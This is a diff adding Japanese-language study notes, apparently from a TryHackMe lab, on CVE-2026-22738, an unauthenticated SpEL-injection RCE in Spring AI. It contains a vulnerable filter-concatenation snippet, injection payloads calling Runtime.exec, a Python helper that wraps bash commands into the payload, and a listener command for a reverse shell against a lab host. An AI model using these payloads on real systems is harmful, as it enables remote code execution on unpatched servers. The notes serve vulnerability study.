@@ -1,5 +1,56 @@
 # CVE
 
+## CVE-2026-22738 (Spring AI)
+
+https://tryhackme.com/room/springaicve202622738
+
+- 認証情報不要のRCE
+- `from 1.0.0 before 1.0.5, from 1.1.0 before 1.1.4`
+- CVE-2022-22963 (Spring Cloud Function) と同じ仕組み
+
+Spring Expression Language (SpEL) は、Spring Framework 全体で使用される汎用式エンジン。  
+修正前のバージョンでは、StandardEvaluationContext が使用されている。
+
+| コンテキスト | 何が露出するか | 適切な用途 |
+|-------------|----------------|------------|
+| StandardEvaluationContext | JVMの完全なリフレクション：メソッド呼び出し、T(...)による型ロード、Beanアクセス | 信頼できる入力のみを扱う内部フレームワーク処理 |
+| SimpleEvaluationContext | 読み取り専用のプロパティおよび配列アクセス、型ロード不可 | ユーザー制御入力に触れるすべての式 |
+
+SpELフィルタのイメージ
+
+```java
+String spel = "#metadata['" + filterKey + "'] == '" + filterValue + "'";
+evaluationContext.evaluate(spel);
+```
+
+ペイロードのイメージ
+
+```java
+"'] + T(java.lang.System).getProperty('java.version') + #metadata['"
+```
+
+```java
+T(java.lang.Runtime).getRuntime().exec("id")
+T(java.lang.Thread).sleep(5000)
+T(java.lang.System).getProperty('java.version')
+```
+
+エクスプロイトの全体は長いのでリンク先URL参照。コア部分は下記の形。
+
+```python
+def spel_filter_key(cmd: str) -> str:
+    return (
+        f'''"'] + T(java.lang.Runtime).getRuntime().exec('''
+        f'''new String[]{{'/bin/bash','-c','{cmd}'}}) + #metadata['"'''
+    )
+```
+
+exploit.py は脆弱性があるかの確認用、listener.py はリバースシェル実行用。
+
+```sh
+python3 listener.py --lhost YOUR_VPN_IP --lport 4444 --exploit --target http://10.145.180.31:8082
+```
+
 ## CVE-2026-25769 (Wazuh)
 
 https://tryhackme.com/room/wazuhcve202625769
